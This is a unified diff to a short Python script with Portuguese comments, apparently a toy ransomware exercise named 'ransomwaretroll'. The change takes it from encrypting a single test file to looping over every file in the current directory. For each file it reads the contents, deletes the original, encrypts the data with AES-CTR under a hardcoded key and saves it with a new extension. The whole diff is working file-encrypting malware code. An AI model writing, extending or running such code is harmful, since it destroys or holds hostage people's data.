@@ -1,24 +1,27 @@
 import os
 import pyaes
 
-## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+# Percorre todos os arquivos na pasta
+for nome_arquivo in os.listdir('.'):
+    caminho_completo = os.path.join('.', nome_arquivo)
 
-## remover o arquivo
-os.remove(file_name)
+    # Verifica se é um arquivo
+    if os.path.isfile(caminho_completo):
+        # Abrir o arquivo a ser criptografado
+        with open(caminho_completo, "rb") as arquivo:
+            file_data = arquivo.read()
 
-## chave de criptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
+        # Remover o arquivo original
+        os.remove(caminho_completo)
 
-## criptografar o arquivo
-crypto_data = aes.encrypt(file_data)
+        # Chave de criptografia
+        key = b"testeransomwares"
+        aes = pyaes.AESModeOfOperationCTR(key)
 
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+        # Criptografar o arquivo
+        crypto_data = aes.encrypt(file_data)
+
+        # Salvar o arquivo criptografado
+        novo_nome_arquivo = nome_arquivo + ".ransomwaretroll"
+        with open(os.path.join('.', novo_nome_arquivo), 'wb') as novo_arquivo:
+            novo_arquivo.write(crypto_data)
